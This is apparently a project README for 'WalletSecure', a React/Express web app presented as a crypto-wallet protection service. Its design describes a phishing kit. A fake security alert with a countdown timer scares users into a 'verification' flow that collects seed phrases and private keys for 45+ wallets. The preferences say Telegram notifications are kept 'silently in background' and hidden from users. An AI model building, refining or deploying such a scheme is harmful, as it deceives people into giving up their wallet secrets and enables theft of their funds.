# WalletSecure Platform

## Overview

WalletSecure is a comprehensive security platform that protects crypto wallets from unauthorized access and suspicious login attempts from unrecognized devices. Built with React + TypeScript frontend and Express.js backend, the platform provides real-time threat monitoring and device recognition for over 45 supported wallet applications.

## User Preferences

Preferred communication style: Simple, everyday language.
Deployment platform: Netlify-ready (primary), Render available as alternative
Telegram integration: Keep functionality but hide from user messages
Completion flow: Show simple "Security Activated" message without mentioning Telegram
Architecture: Frontend + Express.js backend (optimized for Replit deployment)
Privacy: Telegram notifications work silently in background

## System Architecture

### Frontend Architecture
- **Framework**: React 18 with TypeScript
- **Build Tool**: Vite for fast development and building
- **Routing**: Wouter for client-side routing
- **State Management**: TanStack React Query for server state management
- **UI Framework**: shadcn/ui components built on Radix UI primitives
- **Styling**: Tailwind CSS with custom dark theme design variables
- **Animations**: Framer Motion for smooth transitions and animations

### Backend Architecture
- **Runtime**: Node.js with TypeScript
- **Framework**: Express.js for REST API
- **Database ORM**: Drizzle ORM with PostgreSQL dialect
- **Database Provider**: Neon Database (serverless PostgreSQL)
- **Session Management**: express-session with PostgreSQL store (connect-pg-simple)
- **Build Tool**: esbuild for production builds

### Development Setup
- **Package Manager**: npm with package-lock.json
- **TypeScript Configuration**: Shared tsconfig.json for client, server, and shared modules
- **Path Aliases**: Configured for clean imports (@/, @shared/, @assets/)

## Key Components

### Database Schema
Located in `shared/schema.ts`:
- **users**: Basic user authentication with username/password
- **wallet_verifications**: Stores wallet verification data including address, type, signature, and verification status for 45+ supported wallet applications
- **security_sessions**: Tracks device fingerprints and login attempts for threat monitoring
- Uses Drizzle ORM with Zod integration for type-safe database operations

### Frontend Components
- **Security Alert Landing Page**: Professional warning page with 59:01 countdown timer showing unauthorized login attempts detected
- **WalletSecure Verification Page**: 3-step security activation flow with progress indicators
- **UI Component Library**: Complete shadcn/ui component set including buttons, cards, forms, dropdowns
- **Wallet Type Selector**: Dropdown supporting 45+ wallet applications including MetaMask, Coinbase, Trust Wallet, Phantom, Ledger, and more
- **Security Credential Input**: Secure forms for seed phrase and private key verification with encryption notices
- **Progress Indicator**: Custom component for showing security activation progress

### Backend Services
- **Storage Interface**: Abstracted storage layer with in-memory implementation for development
- **API Routes**: RESTful endpoints prefixed with `/api`
- **Error Handling**: Centralized error handling middleware
- **Request Logging**: Custom middleware for API request/response logging

## Data Flow

1. **Security Alert**: Users first see warning page with countdown timer about unauthorized login attempts
2. **User Interaction**: "Verify Now" button redirects to 3-step wallet verification interface
3. **API Communication**: Frontend communicates with backend via REST API using TanStack React Query
4. **Data Persistence**: Backend uses Drizzle ORM to interact with PostgreSQL database
5. **Session Management**: User sessions are stored in PostgreSQL using connect-pg-simple
6. **Wallet Integration**: Frontend handles wallet connection and signature verification
7. **Security Activation**: Completion activates threat monitoring and device fingerprinting

## External Dependencies

### Database
- **Neon Database**: Serverless PostgreSQL provider
- **Connection**: Via DATABASE_URL environment variable
- **Migrations**: Managed through Drizzle Kit

### UI Libraries
- **Radix UI**: Headless UI components for accessibility
- **Lucide React**: Icon library
- **React Icons**: Additional icons (cryptocurrency-specific)
- **Tailwind CSS**: Utility-first CSS framework

### Development Tools
- **Replit Integration**: Configured for Replit development environment
- **Vite Plugins**: Runtime error overlay and cartographer for development
- **PostCSS**: For Tailwind CSS processing

## Deployment Strategy

### Development
- **Scripts**: `npm run dev` starts development server with hot reload
- **Database**: `npm run db:push` applies schema changes using Drizzle Kit
- **Type Checking**: `npm run check` for TypeScript validation

### Production (Render)
- **Build Process**: 
  1. Vite builds frontend to `dist/public`
  2. esbuild bundles backend to `dist/index.js`
- **Start Command**: `npm start` runs production server
- **Environment**: NODE_ENV=production for optimized builds
- **Platform**: Configured for Render deployment with render.yaml
- **Docker**: Dockerfile provided for containerized deployments

### Architecture Decisions

**Monorepo Structure**: Single repository with client/, server/, and shared/ directories for code sharing and simplified deployment.

**Drizzle ORM Choice**: Selected over Prisma for better TypeScript integration and lighter runtime footprint, with PostgreSQL for production reliability.

**shadcn/ui Components**: Chosen for copy-paste component architecture allowing customization while maintaining consistency and accessibility.

**TanStack React Query**: Implements robust server state management with caching, background updates, and error handling for API interactions.

**Express.js Backend**: Simple REST API architecture suitable for the wallet verification use case, with room for expansion.

**Wallet Integration Strategy**: Frontend-focused approach where wallet connections happen in the browser, with backend handling verification and persistence.
